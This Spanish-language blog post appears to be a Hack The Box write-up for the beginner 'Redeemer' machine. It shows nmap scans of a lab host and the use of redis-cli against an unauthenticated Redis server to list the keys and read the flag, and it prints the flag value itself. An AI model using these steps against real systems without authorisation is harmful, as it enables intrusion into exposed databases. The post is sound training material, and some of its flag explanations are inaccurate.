---
layout: single
title: Redeemer - Hack The Box
excerpt: "Redeemer es una máquina muy fácil que forma parte del Tier 0 de las máquinas para principiantes del Starting Point de Hack The Box. Para poder completar esta máquina, tendremos que conectarnos a ella a través de la VPN, para posteriormente comprometer la máquina mediante técnicas de reconocimiento para abusar de las vulnerabilidades existentes. En este caso, estaremos tocando Redis, un servicio de bases de datos en memoria de código abierto con licencia BSD."

date: 2022-10-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-redeemer/redeemer-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - CTFs
  - Linux
tags:   
  - redis
  - redis enumeration
---

![](/assets/images/htb-writeup-redeemer/redeemer-logo.png)

Redeemer es una máquina Linux muy fácil que forma parte del Tier 0 de las máquinas para principiantes del Starting Point de Hack The Box. Para poder completar esta máquina, tendremos que conectarnos a ella a través de la VPN, para posteriormente comprometer la máquina mediante técnicas de reconocimiento y escaneos para abusar de las vulnerabilidades existentes. En este caso, estaremos tocando `Redis`, un servicio de bases de datos en memoria de código abierto con licencia BSD, que se utiliza principalmente como base de datos, caché y agente de mensajes. Los datos se almacenan en un formato de diccionario conteniendo key-values.

## Reconocimiento Inicial

```
ping -c 1 10.129.20.70

PING 10.129.20.70 (10.129.20.70) 56(84) bytes of data.
64 bytes from 10.129.20.70: icmp_seq=1 ttl=63 time=94.1 ms

--- 10.129.20.70 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time Oms
rtt min/avg/max/mdev = 94.119/94. 119/94. 119/0.000 ms
```

## Escaneo de Puertos

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.20.70 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 17:36 CEST
Initiating SYN Stealth Scan at 17:36
Scanning 10.129.20.70 [65535 ports]
Discovered open port 6379/tcp on 10.129.20.70
Completed SYN Stealth
Scan at 17:36, 15.81s elapsed (65535 total ports)
Nmap scan report for 10.129.20.70
Host is up, received user-set (0.096s latency)
Scanned at 2022-08-14 17:36:36 CEST for 16s
Not shown: 62154 closed top ports (reset), 3380 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
6379/tcp  open  redis   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.94 seconds
           Raw packets sent: 77610 (3.415MB) Rovd: 66118 (2.645MB)
```

**Escaneo inicial de puertos abiertos con Nmap**
- **-p-** Escanea todo el rango de puertos [1-65535]
- **--open** Muestro solo los puertos abiertos
- **-sS** Aplica un TCP SYN Port Scan
- **--min-rate** Indica el número de paquetes por segundo a emitir
- **-vvv** Muestra por pantalla la información descubierta durante el escaneo
- **-n** Indica que no se aplicará resolución DNS durante el escaneo 
- **-Pn** Indica que no se aplicará el protocolo ARP durante el escaneo
- **-oG** Exporta el output del escaneo a un fichero en formato grepeable

![](/assets/images/htb-writeup-redeemer/allPorts.png)

```
sudo nmap -sCV -p6379 10.129.20.70 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 17:39 CEST
Nmap scan report for 10.129.20.70
Host is up (0.044s latency).

PORT      STATE SERVICE VERSION
6379/tcp  open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
```

**Escaneo avanzado de detección de versiones y servicios con Nmap**
- **-p** Escanea los puertos especificados
- **-sV** Activa la detección de versiones y servicios
- **-sC** Lanza scripts básicos de reconocimiento y enumeración
- **-oG** Exporta el output del escaneo a un fichero en formato normal

![](/assets/images/htb-writeup-redeemer/targeted.png)

## Detección de vulnerabilidades

Como podemos ver en el escaneo, hemos identificado que el puerto `6379/tcp` está
en estado abierto, ejecutando el servicio de redis. `Redis` es un servicio de bases de datos en memoria de código abierto con licencia BSD, que se utiliza principalmente como base de datos, caché y agente de mensajes. Los datos se almacenan en un formato de diccionario conteniendo key-values. Nuestro objetivo será conectarnos al servidor y ver que podemos enumerar dentro de él para sacar la máxima información posible.

## Explotación de vulnerabilidades

**Redis**

Procedemos a conectarnos al servidor `redis` con `redis-cli` y el parámetro `-h` para especificarle el nombre del host con la `ip de la máquina víctima`.

```
redis-cli -h 10.129.20.70

10.129.20.70:6379>
```

Una vez iniciada la sesión en el servidor, podemos listar todas las `keys` presentes en la base de datos usando el comando `keys *`.

```
10.129.20.70:6379> keys *

1) "flag"
2) "temp"
3) "stor"
4) "numb"
```

Finalmente, podemos ver los valores almacenados de las keys usando el comando `get` para ver la `flag` de HackTheBox, que es nuestro objetivo principal.

```
10.129.20.70:6379> get flag

"03e1d2b376c37ab3f5319922053953eb"
``` 